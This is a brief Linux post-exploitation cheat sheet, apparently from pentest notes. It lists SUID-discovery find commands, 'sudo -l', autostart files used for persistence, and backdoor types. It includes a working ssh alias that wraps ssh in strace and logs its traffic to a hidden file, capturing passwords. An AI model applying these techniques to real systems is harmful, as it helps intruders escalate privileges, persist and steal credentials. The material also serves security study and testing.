persistence
========================================

Privilege escalation
----------------------------------------
- Kernel exploits
- Attack services with root privileges
- Use third-party services to escalate privileges
- Via executable file with SUID attribute
    - Find executable files that may escalate privileges
    - ``find / -perm +4000 -ls``
    - ``find / -perm -u=s -type f 2>/dev/null``
    - ``find / -user root -perm -4000 -print 2>/dev/null``
    - ``find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null``
- Take advantage of available root privileges
    - ``sudo -l``
- Exploiting misconfigured crontab tasks

self start
----------------------------------------
- /etc/init.d
- /etc/rc.d/rc.local
- ~/.bashrc
- ~/.zshrc

back door
----------------------------------------
- ssh backdoor
    - ``alias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh'``
    - Backdoor accounts
- Common applications
    - ICMP
    - DNS
- icmp backdoor
- Backdoor port reuse
- Hidden files starting with ``.``
- rootkit
